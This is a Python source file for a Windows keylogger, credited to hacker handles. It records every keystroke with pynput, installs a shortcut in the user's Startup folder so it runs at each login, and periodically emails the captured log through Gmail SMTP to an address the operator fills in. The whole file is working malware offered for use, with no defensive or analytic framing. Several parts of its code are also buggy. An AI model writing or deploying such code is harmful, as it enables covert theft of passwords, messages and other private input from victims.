# Made by HAR1$AHM3D 
# github link = ""
#Credits:Mighty Ghost Hack
#His github link "https://github.com/mayurkadampro"


from pynput.keyboard import Key , Listener
import os
import shutil 
import datetime
import winshell
from win32com.client import Dispatch
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import socket

save = tempfile.mkdtemp("screen")

#Get Current working directory
cwd = os.getcwd()
#List of files in current directory
source = []
source = os.listdir


date_time = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")

filename = save+"log"+date_time+".txt"
open(filename,"w+") #w+ creats a new file if file is nonexistant

keys = []
count = 0
countInternet = 0
word = "Key."
#Getting User....
username = os.getlogin()

#Creating file shortcout and saving it in startup folder
#Destination path

destinations = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(username)

def main():
    path = os.path.join(destinations,"keylogger.pyw-shortcut.lnk")
    target = r""+cwd+"\keylogger.pyw"
    icon = r""+cwd+"\keylogger.pyw"
    for files in source:
        if files == "keylogger.pyw":
            shell = Dispatch('Wscript.shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()
shortcut = 'keylogger.pyw-shortcut.lnk'
if shortcut in destinations:
    pass
else:
    main()
def connected():
    try:
        socket.create_connection(("www.google.com",80))
        return True
    except OSError:
        pass
        return False

#Mailing Function
def send_email():
    fromaddress = "Senders email address"
    toaddress = "recivers address"
    #Instance of MIMEMultipart
    msg = MIMEMultipart()
    msg['From'] = fromaddress
    msg['To'] = toaddress
    msg['Subject'] = "LOG"
    body = "YAY IT WORKED SENDING YOU KEY LOG'S"
    msg.attach(MIMEText(body,'plain'))
    attachment = open(filename,"rb")
    #Instance of MIMEBASE and named as part 
    part = MIMEBase('application','octet-stream')
    #To change payload into encoder form
    part.set_payload((attachment).read())
    #Encoding 
    encoders.encode_base64(part)
    part.add_header('Content disposition',"attachement; filename=%s" %filename)
    #Attaching instance
    msg.attach(part)
    #making smtp session
    server = smtplib.SMTP('smtp.gmail.com',587)
    #Starting tls for security
    server.login(fromaddress,"your password over here")
    text = msg.as_string()
    server.sendmail(fromaddress,toaddress,text)

    server.quit()


def write_file(keys):
    with open(filename,"a") as f:
        for key in keys:
            if key == 'key.enter':
                f.write('\n')
            elif key == 'key.space':
                f.write(key.replace("Key.space"," "))
            elif key[:4] == word:
                pass
            else:
                f.write(key.replace("'",""))

def on_press(key):
    global keys,count,countInternet,filename
    keys.append(str(key))
    if len(keys) > 10:
        write_file(keys)
        if connected():
            count += 1
            print('connected{}'.format(count))
            if count > 50:
                count = 0
                t1 = threading.Thread(target=send_email, name='t1')
                t1.start()
            else:
                countInternet += 1
                print('Internet is not working')
                if countInternet > 10:
                    countInternet = 0
                    filename = filename.strip(save)
                    for files in save:
                        if files == filename:
                            shutil.copy(files+"t",source)
            keys.clear()
with Listener(on_press=on_press)as listner:
    listner.join()




            


